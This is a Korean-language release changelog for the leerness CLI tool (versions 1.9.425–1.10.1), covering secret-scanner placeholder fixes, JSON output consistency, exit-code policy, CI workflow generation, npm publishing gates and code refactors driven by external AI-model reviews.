## 1.10.1 — 2026-06-08 — 시크릿 스캐너 AWS …EXAMPLE 키 오탐 수정 (12th 외부평가 Opus P3, UR-0144)

**🔒 AWS 공식 예제키(AKIA…EXAMPLE) 오탐 차단 — 실키 FN 정책은 보존.**

### 변경
- `_isPlaceholderSecret`: 값이 **'example' 로 끝나면(접미사)** placeholder 로 판정 — AWS 문서 표준 예제키 `AKIAIOSFODNN7EXAMPLE` 등 오탐(FP) 차단.
- **중간에 'example' 이 있는 실키**(`sk-EXAMPLEab12…`, `sk-proj-realKEYexample…`)는 접미사가 아니라 미해당 → 실키-FN 정책(UR-0105) 보존. 실키가 'example' 로 끝날 확률 0.
- 직전 시도(1.9.440)에서 'example' 통째 매칭이 FN 정책과 충돌해 보류했던 것을 접미사 한정으로 정밀 해결.

### 함께 종결 (코드 변경 없음)
- **UR-0142** intent classify 항상 default → **by-design**: intent classify 는 precise/broad scope 분류이며 default 는 scope 신호 없는 입력의 정상 중립 결과(맹신 X 직접 재현: "정확히"→precise, "전체 다양한"→broad). 리뷰의 task-type 기대는 오해.

### 검증 (회귀 0)
- **selftest 194→195** (AWS EXAMPLE placeholder + 중간 example 실키 real + 진짜키 탐지), 기존 FN 정책 셀프테스트(UR-0106/0109) 유지.
- patch(1.10.1, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

## 1.10.0 — 2026-06-08 — 🛡️ [안정화/Stable] 1.10 안정 minor (배포 정책 첫 minor 릴리스)

**🛡️ 안정화(Stable) minor — patch 누적(1.9.446~449)을 검증·통합해 npm 에 안정 버전으로 공개.** R-0011 배포 정책(patch 는 누적, minor 만 npm 공개)의 첫 minor 릴리스.

### 이번 minor 에 담긴 개선 (1.9.446~449, 그동안 GitHub 에만 누적)
- **npm 배포 minor-gate** (UR-0160): patch 는 npm 미배포, minor/major 변동 시에만 안정 배포. `release sync-main . --publish-npm` 강제 옵션.
- **plan progress 읽기전용 요약** (UR-0145): 완료율% + 상태별 + `--json` + 변경의도 인자 경고(silent ignore 제거).
- **export/prompt = adapter 별칭** (UR-0154, GPT-5.5 §6.6): `export --target claude|cursor|codex|agents-md`.
- **plan drop 역할 분리** (UR-0143): scope 드랍을 plan.md(Out of Scope)에만 기록, progress-tracker phantom task 제거.

### 직전 안정(1.9.x)부터의 핵심 (참고)
- evidence-first 완료 게이트 `completion_claim_allowed` (UR-0153, GPT-5.5 §6.3), CI/PR 턴키 `ci init` (UR-0152, §6.7), task/add-family positional path (UR-0141/0151), 시크릿 스캐너 prefix placeholder 가드(12th 리뷰 Opus P2), README ASCII 배너.

### 검증 (회귀 0)
- **selftest 194 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump(배포) 확인.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.9.449 — 2026-06-08 — plan drop: progress-tracker T- 행 미생성 (12th 외부평가 Sonnet P3, UR-0143)

**🐛 plan↔progress 역할 분리: scope 드랍이 phantom task 를 만들던 문제.**

### 변경
- `plan drop` 이 progress-tracker 에 `dropped` 상태의 `T-` task 행을 만들던 동작 제거 — 이제 plan.md `## Out of Scope / Dropped`(D-) 에만 기록. scope 드랍의 단일 출처 = plan.md.
- 기존엔 scope 드랍 1건이 plan.md D- + progress-tracker T- 양쪽에 생겨 plan↔progress 역할 혼선 + `task list` 노이즈(실제 작업 아닌 phantom T-) 발생.

### 검증 (회귀 0)
- **selftest 193→194** (planDrop 에 dropped-task upsert 없음 + ok 메시지가 plan.md 가리킴), 행위 재현: plan drop → D-0001 기록 + progress T- 행 미증가.
- patch(1.9.449, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

## 1.9.448 — 2026-06-08 — export/prompt = adapter 별칭 (GPT-5.5 전략리뷰 §6.6/7.3, UR-0154)

**🔌 GPT-5.5 권고 표면명 정합: `leerness export/prompt --target <agent>`.**

### 변경
- 신규 `export --target <agent>` / `prompt --target <agent>` — 기존 `adapter <tool>` 의 별칭(도구별 지침/계약 파일 생성: claude/cursor/codex/copilot/goose). `--target` 플래그 또는 positional 모두 지원, 미지정 시 list.
- `agents-md`/`agents`/`agent` → `codex`(AGENTS.md 생성) 별칭 매핑 — GPT-5.5 가 권고한 `export --target agents-md` 가 그대로 동작.
- GPT-5.5 전략리뷰가 권고한 명령 표면명(`export`/`prompt --target`)을 기존 adapter 위에 제공 → 외부 사용자 발견성↑.

### 검증 (회귀 0)
- **selftest 192→193** (와이어), 행위 재현: `export --target claude`→CLAUDE.md, `export --target agents-md`→AGENTS.md.
- patch(1.9.448, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

### 보류 메모
- UR-0146(init --json 순수화): init=install 큰 핸들러의 다중 log(~15) quiet-mode 게이팅 필요 — P3 대비 침투적이라 quiet-mode 리팩터 라운드로 보류. audit --fix --json 의 fixApplied(=fix모드)/fixed(=카운트)는 의미상 일관(by-design).

## 1.9.447 — 2026-06-08 — plan progress 읽기전용 요약 명확화 (12th 외부평가 Codex P3, UR-0145)

**🐛 명령명-동작 불일치 해소: `plan progress` 가 인자를 silent ignore 하던 문제.**

### 변경
- `plan progress` 를 읽기 전용 진행 요약으로 명확화 — **완료율%**(done/total) + 상태별 카운트 + 마일스톤 수 출력. `--json` 구조화 지원.
- `plan progress M-0002 --status … --progress …` 처럼 변경 의도 인자가 오면 **읽기 전용임을 경고**(기존: silent ignore) — 상태/진행 변경은 `task update`/`plan add|drop` 안내.
- 기존엔 task status 카운트만 출력하며 명령명이 milestone 변경처럼 오인됨.

### 검증 (회귀 0)
- **selftest 191→192** (richer 출력 + --json + 변경의도 경고 와이어), 행위 재현: 완료율 1/3(33%)·--json(total/done/percent)·M-id+--status 시 경고.
- patch(1.9.447, 같은 minor) — R-0011 정책상 npm 미배포, GitHub 만 갱신.

## 1.9.446 — 2026-06-08 — npm 배포 minor-gate (R-0011/UR-0160)

**📦 배포 정책 도구화: npm 배포는 minor(x.x) 변동 시에만 — patch(x.x.x) 는 자동 스킵.**

### 변경
- 순수 `_shouldPublishNpm(current, published, force)` + `_minorKey` (pure-utils): npm latest 와 major.minor 비교 → minor/major ↑ 면 배포, 같은 minor 내 patch 면 스킵. 최초/force 는 배포.
- `_publishToNpm` 에 minor-gate 추가(1.5단계): `npm view <pkg> version` 으로 latest 확인 후, 같은 minor patch 면 npm publish 스킵(GitHub 커밋·CHANGELOG 는 유지). `release sync-main . --publish-npm` 으로 강제 배포.
- 사용자 정책(R-0011): 자잘한 patch 는 npm 미배포로 누적, 안정화되면 minor 올려 안정 버전만 npm 노출 → npm latest 안정성 향상.

### 검증 (회귀 0)
- **selftest 190→191** (순수 7케이스 + 와이어): 1.9.446 vs 1.9.445=스킵(same_minor), 1.10.0=배포(minor_bump), 2.0.0=배포, force/최초=배포.
- 본 패치(1.9.446)부터 정책 적용 — npm 미배포(같은 minor), GitHub 만 갱신.

## 1.9.445 — 2026-06-08 — add-family positional path 일관화 (UR-0151, UR-0141 후속)

**🐛 데이터 오염 일관화: `decision/lesson/rule add` 도 positional path 인식 (task 와 동일).**

### 변경
- `decision add`, `lesson save`, `rule add` 가 positional path 를 인식 — `--path` > path-like positional > cwd. 1.9.442(task)에서 도입한 순수 `_taskPositionalPath` 재사용 → 제목/내용은 경로로 오인 안 함(선행 구분자 only), 값-플래그값(`--reason`/`--trigger`/`--tag` 등) 제외.
- `_TASK_VALUE_FLAGS` 에 add-family 값-플래그(`--trigger`/`--tag`) 추가.
- 기존엔 블록 root 가 `arg('--path', cwd)` 만 사용 → 비-루트 cwd 에서 add 시 cwd 오염(멀티프로젝트). 이제 task 와 일관.

### 검증 (회귀 0)
- **selftest 189→190** (와이어 3종 + --trigger 값 제외), **E2E 신규 B(1.9.445)**: 다른 cwd 에서 decision/lesson/rule add `<ws>` → ws 저장 + cwd 오염 0.

## 1.9.444 — 2026-06-08 — CI/PR 턴키: leerness ci init (GPT-5.5 전략리뷰 §6.7, UR-0152)

**⚙️ leerness 를 팀/CI 품질 게이트로 확장 — PR 마다 `leerness gate` 를 실행하는 GitHub Actions 워크플로 1-커맨드 생성.**

### 변경
- 신규 `leerness ci init [path] [--force] [--json]`: `.github/workflows/leerness-gate.yml` 생성 — `on: pull_request` 에서 `npx -y leerness gate .` 실행. gate = verify + audit + scan secrets + encoding + lazy. **exit 1 시 PR 체크 실패** → 증거 없는 완료·커밋 시크릿·인코딩 깨짐·규칙 위반을 CI 에서 차단.
- 워크플로 상단에 **exit-code 정책 주석** 명시(통과=0 / 실패=1). 멱등(이미 존재 시 경고, `--force` 로 덮어쓰기). `--json` 구조화 출력.

### 검증 (회귀 0)
- **selftest 188→189** (워크플로 콘텐츠 + 와이어), **E2E 신규 B(1.9.444)**: `ci init` → 파일 생성 + 핵심 라인(name/pull_request/gate) 포함 + 재실행 멱등.
- 행위 재현: 임시 워크스페이스에 워크플로 생성·내용 검증·멱등 확인.

## 1.9.443 — 2026-06-08 — evidence-first 완료 게이트 completion_claim_allowed (GPT-5.5 전략리뷰 §6.3/6.4, UR-0153)

**🔒 leerness 최대 차별점 강화: 증거로부터 "완료 주장 가능 여부"를 파생·노출.**

### 변경
- 순수 `_completionClaimAllowed(record)` (pure-utils): run-record 증거 기반 완료 게이트 — **변경 파일 존재 + 검증 실행(tests/commands) + 미해결 errors 0 + verification_result === 'pass'** 일 때만 `allowed:true`. 미검증/실패/증거부족은 사유(reasons)와 함께 불허.
- `state show`(text + `--json`), `state verify --json`, `state handoff`(latest.json + .md + --json) 에 `completion_claim_allowed` 노출 → 다음 에이전트/PR 리뷰어가 증거 게이트를 직접 읽음.
- GPT-5.5 전략리뷰가 evidence-first 를 핵심 차별점으로 명시 — run-record 14필드 스키마(기존)에 완료 가능성 판정을 더해 "완료 주장 ↔ 증거" 연결을 표면화.

### 검증 (회귀 0)
- **selftest 187→188** (순수 6케이스 + state/handoff 와이어), **E2E 신규 B(1.9.443)**: 증거 없음 → no(사유), 증거+verify pass → allowed.
- 행위 재현: state start→show(no) → record+verify pass → show(--json allowed=true, reasons=[]).

## 1.9.442 — 2026-06-08 — task 계열 positional path 지원 (12th 외부평가 Sonnet P1, UR-0141)

**🐛 P1 데이터 오염 수정: `task add "제목" ./경로` / `task list /경로` 가 무시되고 cwd 에 저장되던 문제.**

### 변경
- `task list/add/update/drop/...` 가 positional path 를 인식 — `--path` > path-like positional > cwd 우선순위. 기존엔 `arg('--path', cwd)` 만 사용해 positional 경로를 무시 → 프로젝트 루트가 아닌 cwd 에서 실행 시 엉뚱한 곳에 메모리 생성(멀티프로젝트 오염).
- 순수 `_taskPositionalPath(args, startIdx)` (pure-utils): `_parseAddTitle` 과 동일한 path-like 판정(선행 구분자 `/ ./ ../ C:\`)으로 **제목/ID/맨이름은 경로로 오인하지 않음**(`task add "fix src/auth bug"` 의 내부 슬래시 제목 보호). **값-취하는 플래그의 값**(`--evidence /abs/log`)도 경로 후보에서 제외.

### 검증 (회귀 0)
- **selftest 186→187** (순수 7케이스 + 와이어), **E2E 신규 B(1.9.442)**: 다른 cwd 에서 `task add "x" <ws>` → ws 에 저장 + cwd 오염 0.
- 행위 재현으로 확인: positional 경로 저장 + cwd `.harness` 미생성. `--path` 최우선·내부슬래시 제목·Windows 경로(`C:\`,`C:/`)·boolean 플래그 뒤 경로 전부 정상.

## 1.9.441 — 2026-06-08 — README ASCII 배너 추가

**🎨 README 최상단에 LEERNESS ASCII 아트 배너 추가(CLI `_banner` 와 동일 아트).**

### 변경
- `README.md` 상단에 LEERNESS 블록레터 ASCII 배너를 코드블록으로 표시 — CLI init 배너(`_banner`)와 동일한 아트로 브랜드 일관성.
- selftest: README ↔ CLI `_banner` 동일 배너 라인 검증.

### 검증 (회귀 0)
- **selftest 185→186 PASS** · **E2E 무회귀**.

## 1.9.440 — 2026-06-08 — 🛡️ [안정화/Stable] 시크릿 스캐너 prefix 패턴 placeholder 가드 (12th 외부평가 Opus P2, UR-0140)

**🛡️ 안정화 릴리스(Stable) — 보안 스캐너 False-Positive 가 CI 를 깨던 문제 수정.**

### 변경 (12th 외부 멀티모델 리뷰 Opus P2)
- **`scan secrets`/`gate`/`audit` 시크릿 스캐너**: placeholder 가드(`_isPlaceholderSecret`)가 `valueGroup` 있는 2개 패턴에만 적용돼, **AWS/GitHub 등 19개 prefix 패턴은 가드를 우회**(1.9.436 픽스가 그들에겐 dead code). → `.env.example`(placeholder 전용, gitignore 대상 아님)의 더미 토큰(`AKIAXXXX…`/`ghp_XXXX…`)이 커밋 시크릿으로 오탐 → `scan/gate/audit` 실패(exit 1) → CI 파손.
- **수정**: `valueGroup` 없으면 전체 매치(`m[0]`)로 placeholder 판정 — 19 prefix 패턴도 8연속 더미/마커 가드 적용. `requireSecretLike` 는 valueGroup 한정 유지. **진짜 키(고엔트로피)는 그대로 탐지**(회귀 0), `sk-EXAMPLE…` 류 실키-FN 정책도 유지.
- 통합 갭 방지: selftest 가 순수 함수만이 아닌 **스캐너 경로**도 검증(Opus 지적), E2E B(1.9.440) 추가(.env.example 더미 미탐 + 진짜 탐지).

### 검증 (회귀 0)
- **selftest 184→185** + **E2E 신규 B(1.9.440)**: 더미 prefix 토큰 미탐(exit 0) + 진짜 AWS 키 탐지(exit 1) + sk-EXAMPLE 실키 유지.
- 맹신 X: 내 1.9.436 의 불완전성(prefix 패턴 미적용)을 12th 리뷰가 적발, 직접 재현·수정. P3(AWS …EXAMPLE 키 FP)는 기존 FN 정책 충돌로 UR-0144 분리.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag/GitHub release (Stable) · npm dist-tag `stable`.

## 1.9.439 — 2026-06-08 — drift --auto-fix --json 순수성 (10th 외부평가 Codex P1, UR-0135 완결)

**📐 `drift check --auto-fix --json` 이 dirty 워크스페이스에서 진행로그를 stdout 에 섞던 비-순수 JSON 해소.**

### 변경
- **`lib/drift.js`**: `--json` 시 auto-fix 진행로그(보안회복/인코딩/delivered/idempotency/release ~28건)를 `afLog`(no-op)로 무음화. depth 가드(1.9.432)로 재귀가 auto-fix 블록을 건너뛰고 최종 JSON 만 출력 → stdout 순수 JSON 보장. 텍스트 모드는 진행로그 그대로 유지(최종 JSON 출력 `log()` 는 불변).

### 검증 (회귀 0)
- dirty WS(보안 신호 발화) `drift --auto-fix --json` → 순수 JSON 파싱 성공. 텍스트 모드 진행로그 3건 유지.
- **selftest 183→184** + **E2E 신규 B(1.9.439)**. → 10th 외부평가 Codex P1(--json 전 경로 순수성) 완결.

## 1.9.438 — 2026-06-08 — contract impl ESM re-export 인식 (11th 외부평가 Sonnet P3, UR-0139 완결)

**🧩 `export { default as X } from './m'` 재export 의 별칭 X 를 named export 로 인식.**

### 변경
- **`_parseImplExports` ESM 목록 파서**: `default as X` 는 별칭 X 가 named export 이므로 `as` 별칭을 먼저 채택(이전엔 `default` 시작이라 통째로 스킵 → contract verify false negative). `export { foo, bar as baz } from './x'` 도 정상. 단독 `export default`/`type X` 는 제외 유지. `export * from`(이름 정적 불가)은 미지원(문서화).

### 검증 (회귀 0)
- `export { default as getUserById } from` → `[getUserById]`; `foo, bar as baz` → `[foo,baz]`; 단독 default → `[]`; 일반 ESM 무회귀.
- **selftest 182→183 PASS** · **E2E 무회귀**. → UR-0139(AKIA placeholder + ESM re-export) 완결.

## 1.9.437 — 2026-06-08 — --json 에러 전역화: unknown command + 무효 choice (11th 외부평가 Codex P2/P3, UR-0138)

**📐 자동화(CI/MCP)가 모든 에러 경로를 JSON.parse 할 수 있도록 중앙 에러 2종을 순수 JSON 화.**

### 변경
- **중앙 unknown command 폴백**: `알 수 없는 명령` → `--json` 시 `failJson(..., 'unknown_command', …)` (`{ok:false,error,code}`).
- **`_validateChoice`**(task update/plan status 등 공용): 무효값 거부도 `--json` 시 `failJson(..., 'invalid_choice', …)`. 한 곳 수정으로 status/trigger 등 전 검증 경로 커버.
- 텍스트 모드 출력 무변경.

### 검증 (회귀 0)
- `bogus-cmd --json` → `code:unknown_command`; `task update <id> --status nonsense --json` → `code:invalid_choice`. 텍스트 모드 동일.
- **selftest 181→182 PASS** · **E2E 무회귀**.

### UR-0138 잔여
일부 명령별 ad-hoc 에러(plan add 등) + lazy/audit --fix --json stale 는 후속(중앙 핸들러화 점진).

## 1.9.436 — 2026-06-08 — 시크릿 스캐너 all-X/0 placeholder FP 차단 (11th 외부평가 Opus P3, UR-0139)

**🔑 `AKIAXXXXXXXXXXXXXXXX`(전부 X 더미)를 실키로 오탐하던 FP — prefix 보다 우선하는 더미 가드.**

### 변경
- **`_isPlaceholderSecret`**: 본문(alnum)에 **동일문자 8+연속**(`XXXXXXXX`/`00000000`/`aaaaaaaa`)이 있으면 실키 prefix(akia/sk- 등) 여부와 무관하게 placeholder 로 판정. 암호학적 실키는 고엔트로피라 8연속이 없어 무영향.
- 기존 `hasRealPrefix → 실키` 규칙보다 앞에 배치(AKIA 등 prefix + 더미 본문 FP 해소).

### 검증 (회귀 0)
- AKIA all-X / sk-0000… → placeholder(미탐). 실키스러움/`sk-test-…`/`ghp_…` 토큰 → 탐지 유지.
- **selftest 180→181 PASS** · **E2E 무회귀**.

### UR-0139 잔여
contract impl ESM re-export(`export {default as X} from`/`export *`) 인식 + encoding CRLF 미탐지는 후속.

## 1.9.435 — 2026-06-08 — agents dispatch task flag-value 흡수 차단 (11th 외부평가 Codex P2, UR-0137)

**🧹 `agents dispatch "<task>" --to codex` 의 생성 명령에 `codex`(또는 경로)가 task 본문으로 섞이던 문제.**

### 변경
- **`lib/agents.js` dispatch/multi `_taskArg`**: 상위(bin)에서 `--to` flag 는 제거되나 그 값(codex)은 positional 로 남아 기존 `filter(!startsWith('-'))` 가 task 에 흡수시켰음. → 첫 flag 에서 break + lib 가 소비하는 값-flag(`--to`/`--model`/`--role`/`--only`) 값을 task 에서 제외. 명시 task 는 `--task` 폴백.
- 결과: `dispatch "REVIEWTASK" --to codex --path X` → 생성 명령 `codex exec … "REVIEWTASK"`(codex/경로 미흡수). 양쪽 인자 순서 안전.

### 검증 (회귀 0)
- **selftest 179→180** + **E2E 신규 B(1.9.435)**: dispatch task 에 `--to`/경로 값 흡수 없음.

## 1.9.434 — 2026-06-08 — health/drift/status 미존재 경로 exit 1 통일 (11th 외부평가 Opus P2, UR-0136)

**🚧 존재하지 않는 경로를 "healthy"로 위조 보고하던 문제 — CI 게이트 안전성.**

### 변경
- **`health` / `drift check` / `status`**: 진입부에서 `!exists(root)` 면 `failJson(has('--json'), 'path_not_found', …)` + **exit 1**(audit/verify 와 일치). 기존엔 phantom 경로를 exit 0 + healthy 로 보고 → 오타 경로/미초기화 디렉토리를 CI가 통과시킴.
- 유효하지만 미초기화(.harness 없는 기존 디렉토리)는 종전대로 정상 보고(가드는 디렉토리 존재만 확인).

### 검증 (회귀 0)
- 미존재 경로: health/drift/status 전부 exit 1, `--json` 은 `{ok:false, code:"path_not_found"}` 순수 JSON. 클린/미초기화 WS: exit 0 유지.
- **selftest 178→179 PASS** · **E2E 무회귀**.

## 1.9.433 — 2026-06-08 — 11번째 외부평가: contract verify backtick-bullet 강선언 FN 수정 (UR-0136~0139)

**🔍 11번째 외부 멀티모델 리뷰(Codex/Sonnet/Opus, README 미참조, 1.9.432). 5개 회귀항목 전부 정상 확인 + contract verify P1 신규 적발.**

### 수정 (확정·맹신 X 직접 재현)
- **[P1] contract verify backtick-bullet 강선언 우회(FN)** (Codex+Opus 교차확인): CLI 자체 관례인 `` - `name()` 필요 `` / `` - `field`: 설명 `` 표기가 **약언급(mentioned)으로 분류돼 누락검사 우회** → 구현에 없어도 ok:true/exit 0. `_parseContractSpec` 의 강선언 bullet regex(함수·필드)에 **bullet 시작 backtick 허용**. 인라인 산문 backtick 은 약언급 유지(관대성), 공백+괄호 산문(`- result (total)`) FP 가드 유지.

### 검증 (회귀 0)
- **selftest 177→178 PASS** (backtick 함수/필드 강선언 + 산문 약언급 + FP 가드). contract verify e2e: 누락 함수/필드 → ok:false/exit 1.
- **E2E 무회귀**.

### 5개 회귀항목 독립 검증 — 전부 정상
health memorySurface(STATUSES) · check/plan show/review-request --json 순수성 · contract 멀티라인/ESM · health 보안 exit 1 · drift 재귀 종료성.

### 맹신 X — 기각 2건 (직접 재현으로 반증)
- Sonnet "동시 task add 데이터 유실(P1)" → node 정밀 재현 **3/3 무손실·dup 0**(bash `&` 아티팩트). e2e B(1.9.303) + CPU포화 5/5 와 일치.
- Sonnet "GitHub 토큰(ghp_/github_pat_) 미탐지(P2)" → **정상 탐지·exit 1** 확인.

### 후속 백로그 (UR-0136~0139)
nonexistent path exit 통일 · agents dispatch flag bleed(_parseAddTitle) · --json 에러 전역화 · ESM re-export/encoding CRLF/AKIA placeholder.

## 1.9.432 — 2026-06-08 — drift --auto-fix 재귀 depth 가드 (10th 외부평가 Opus latent, UR-0131 잔여)

**🛡️ drift --auto-fix 재귀의 잠재적 무한재귀 방어(방어적 — 현재 신호 타입에선 미발현 확인).**

### 변경
- **`lib/drift.js`**: `autoFix = has('--auto-fix') && !opts._noAutoFix`. 두 재귀점이 `{ ...opts, _noAutoFix: true }` 전달 → 재귀는 auto-fix 블록 재진입 금지(명시 1회 보장).
- 기존엔 재귀가 `has('--auto-fix')`(전역 argv)를 재독해 auto-fix 분기에 재진입, 종료가 "audit --fix가 보안 신호를 항상 지운다"는 취약 불변식에 의존. 미래에 audit이 못 고치는 신호 타입이 추가되면 무한재귀 위험.

### 검증 (맹신 X)
- Opus의 "infinite recursion" 우려를 직접 재현 시도 → **현재 미발현**(보안 신호는 gitignore 기반이라 audit --fix가 항상 해소). 그러나 불변식 의존은 취약 → 방어적 가드는 정당.
- **selftest 176→177 PASS**(depth 가드 소스 + 기존 1.9.422 재귀 케이스 갱신) · 발화 케이스 정상 종료(exit 0) 확인 · **E2E 무회귀**.

### 분리 (UR-0135)
drift --auto-fix --json 비순수(dirty WS 진행로그)는 재귀가 auto-fix 블록 내부라 stdout 캡처 재구조화 필요 → 신중한 별도 라운드로 분리.

## 1.9.431 — 2026-06-08 — health exit code 정책: 보안 CRITICAL CI 게이트 (10th 외부평가 UR-0130)

> 1.9.430(npm 게시)에서 e2e 테스트 픽스처가 `sk_live_` 패턴(Stripe 실키 형태)이라 GitHub push-protection에 막혀 git 미반영. 픽스처를 코드베이스 관례인 `sk-test-`(GitHub-safe + leerness 탐지)로 교체하고 1.9.431로 정리(git=npm=tag 정합). 동작 동일.

### 변경 (1.9.430 + 픽스처 패턴 수정)

**🚦 health 를 CI 게이트로 쓸 때 하드코딩 시크릿을 놓치던 문제 — exit code 정책 명확화.**

### 변경
- **`health`**: 보안 CRITICAL(커밋 대상 하드코딩 시크릿 / `.env` 가 `.gitignore` 미포함)이면 **`--strict` 없이도 exit 1**. `scan secrets` 와 exit code 일치 → health 만으로도 시크릿 유출을 CI에서 차단.
- 비-CRITICAL issue(drift·env.example 누락 등)는 종전대로 exit 0(게이트는 `--strict`). JSON 에 `criticalSecurity` 노출.
- 맹신 X 판단: 3개 명령(health/audit/drift) 전부 exit 1로 바꾸면 기존 non-strict 워크플로가 깨지므로, **방어 가능한 보안-크리티컬 케이스(health)만** 변경. audit/drift 는 메타/정보성이라 `gate` 가 하드 게이트 역할 유지.

### 검증 (회귀 0)
- **selftest 175→176 PASS** + **E2E 신규 B(1.9.430)**: 커밋 시크릿 → exit 1, 클린 → exit 0.

### e2e 락 테스트 flake 하드닝 (dev 전용, 패키지 무영향)
- 락 제품 로직은 **CPU 포화 하 독립 5/5 무결**(dup=0/sep=1) 검증됨. 전체 e2e 자원압박 시 6개 async `cp.spawn` 일부가 EAGAIN 미기동 → found<N 타임아웃 flake.
- 테스트 하네스 보강: spawn `error` 동기 재시도 + post-poll 누락분 동기 재추가. 락 무결성(dup/sep/lost-update) 검증은 유지.

## 1.9.429 — 2026-06-07 — contract verify impl 파서 강화: 멀티라인 + ESM (10th 외부평가 UR-0129)

**🧩 contract verify 의 export 인식 false-negative 2종 수정 — 현대 JS 프로젝트 대응.**

### 변경
- **`lib/pure-utils.js _parseImplExports(src)` 신설**(테스트 가능 순수 파서) + bin 단일출처화:
  - **브레이스 균형 + top-level 키**: `module.exports = { login: function(){…}, logout: … }` 멀티라인/함수값에서 **첫 키만 인식되던 버그**(정규식 `[^}]+`가 함수 본문 `}`에서 중단) 수정 — 이제 전 키 인식.
  - **ESM 인식 추가**: `export function/const/let/var/class foo`, `export { a, b as c }`(as 별칭 우선, default/type 제외).
- 기존 `exports.foo` / `module.exports.foo` 유지.

### 검증 (회귀 0)
- **selftest 174→175 PASS** (멀티라인 3키 + ESM 양식 + 단일출처 가드).
- 파서 5케이스 직접 검증 + contract verify e2e(멀티라인 `login/logout/verifyToken` 전부 + ESM) 확인.
- **E2E 무회귀**.

## 1.9.428 — 2026-06-07 — --json 순수성: check / plan show / review-request (10th 외부평가 UR-0128)

**📐 자동화 소비자(CI/MCP)를 위한 --json 일관성 — 텍스트만 내던 3개 경로를 순수 JSON 화.**

### 변경
- **`check --json`**: 텍스트("✓ … present") → `{ root, healthy, issues, checks:[{name,kind,ok}] }`.
- **`plan show --json`**: raw 마크다운(frontmatter 포함) → `{ exists, milestones:[…], raw }`.
- **`review-request "" --json`**: 텍스트 usage 에러 → `failJson` 으로 `{ ok:false, error, code:"review_request_empty" }`.
- 텍스트 모드는 출력 무변경(회귀 0).

### 검증
- **selftest 173→174 PASS** (planShow text=비JSON / --json=JSON 행위검증 + 3핸들러 소스 가드).
- **E2E 무회귀**.

### 잔여 (UR-0128 후속)
drift --auto-fix --json 비순수(dirty WS, 한국어 로그 선행) + audit --fix --json stale findings 는 후속 라운드.

## 1.9.427 — 2026-06-07 — DI 완전성 메타체크: 모듈화 회귀 근본 차단 (UR-0131)

**🛡️ 10번째 외부평가의 구조적 발견(selftest가 DI 누락 회귀를 못 잡음) 근본 해결.**

### 변경
- **selftest 신규 케이스**: 6개 DI 모듈(review-request/audit/drift/health/agents/session-close) 각각의 `const {...} = deps` destructure 이름이 **bin wrapper 의 전달 deps 객체에 모두 포함**되는지 소스 분석으로 검증. 누락 시 selftest 실패 → 향후 모듈 추출에서 `STATUSES`류 dep 누락(1.9.423 회귀)을 **자동 적발**.
- 자기참조 함정 회피: 케이스의 regex 리터럴이 자신을 매치하지 않도록 `return ` 프리픽스로 실제 wrapper 만 타깃.

### 검증 (회귀 0)
- **selftest 172→173 PASS**. 회귀 적발력 확인: health destructure 에서 STATUSES 임시 제거 시 메타체크가 정확히 실패, 복원 시 통과.
- **E2E 무회귀**.

## 1.9.426 — 2026-06-07 — 10번째 외부평가: 모듈화 회귀(health) 수정 + contract/rule 일관성 (UR-0128~0131)

**🔍 10번째 외부 멀티모델 리뷰(Codex GPT-5.5 + Claude Sonnet/Opus 4.8, README 미참조 클린룸, 1.9.425)로 6회 모듈화 직후 무결성 독립 검증 — 모듈화 회귀 1건 적발·수정.**

### 배경
6회 큰 핸들러 추출 직후 코드-위험 0인 독립 리뷰로 회귀 여부 확인. 모든 발견 직접 재현·검증(맹신 X).

### 수정 (확정·저위험)
- **[P1 모듈화 회귀] health memorySurface 항상 실패**: 1.9.423 health 추출 시 종합 의존 스캔이 **대문자 상수 `STATUSES`를 제외**해 DI 누락 → `health --json` 의 `memorySurface` 가 항상 `{error}`. **Codex·Sonnet 독립 동시 적발**(Opus는 놓침). STATUSES 주입으로 수정. (session-close 1.9.425에서 STATUSES/MARK 교훈을 얻기 전 라운드라 누락됨.)
- **[P3] contract verify 텍스트 `tick.` 유령 프리픽스**: `## Fields` 범용화(1.9.417) 후에도 누락 필드를 `- tick.createdAt` 로 표기(JSON 은 정상). 레거시 프리픽스 제거.
- **[P2] rule add 경로/trigger 값 흡수**: `rule add "설명" --trigger X /path` 가 설명에 `X`·`/path` 를 흡수. `_parseAddTitle`(1.9.416) 적용으로 flag/경로 break.

### 회귀가드 강화
- health selftest 가 **STATUSES 주입 + memorySurface 비-error** 를 검증하도록 강화(리뷰 지적: 기존 selftest 가 이 회귀를 못 잡음).

### 검증 (회귀 0)
- **selftest 171→172 PASS** · **E2E 425→426 PASS**.

### 3모델 긍정 평가
데이터무결성·인코딩·시크릿·**동시성(8-way 무손실)**·**DI 모듈 경계**가 동급 대비 견고. P0/P1 데이터손상·크래시 없음. (Opus: "DI 구조 깨끗 + wrapper composition root 견고".)

### 후속 백로그 (UR-0128~0131, 다음 라운드)
--json 전 경로 순수성(drift --auto-fix/check/plan show/review-request/audit --fix) · contract impl 파서 강화(멀티라인/ESM) · health/audit/drift exit code 정책 · selftest DI 완전성 메타체크 + drift 재귀 depth 가드.

## 1.9.425 — 2026-06-07 — 무거움 점진 해소 6: sessionClose → lib/session-close.js 모듈화 (UR-0025/UR-0125)

**🪶 `bin/leerness.js` 무거움 점진 해소 6단계 — `session close` 핸들러(599줄, 9 카테고리 보고)를 lib/ 로 DI 분리.**

### 변경
- `lib/session-close.js` 신설(615줄): `sessionClose(root, opts, deps)` — io는 `./io`, `_sanitizeFences`/`_parseArchiveBlocks`는 `./pure-utils`, cp/os/path/fs 빌트인, harness 고유 의존 41종(STATUSES·MARK 포함) DI 주입, `__filename`→`harnessPath`.
- `bin/leerness.js`: 599줄 → **3줄 thin wrapper**. **19,588 → 19,003줄(−585)**.
- 동작/출력 무변경(9 카테고리 + 활성 룰 검증 + retro + pre-wake/idempotency audit + --json 동일).

### 검증 (회귀 0)
- **selftest 170→171 PASS** (모듈 + DI 위임 + STATUSES/MARK 주입 + 본문 이동(recommendedDirection)).
- 기존 selftest 2건(UR-0066 agents·1.9.316 drift-marker)의 본문 소스 검사를 해당 lib 파일 참조로 갱신(모듈 이동 동반 패턴).
- **E2E 424→425 PASS** (session close 다수 경로).

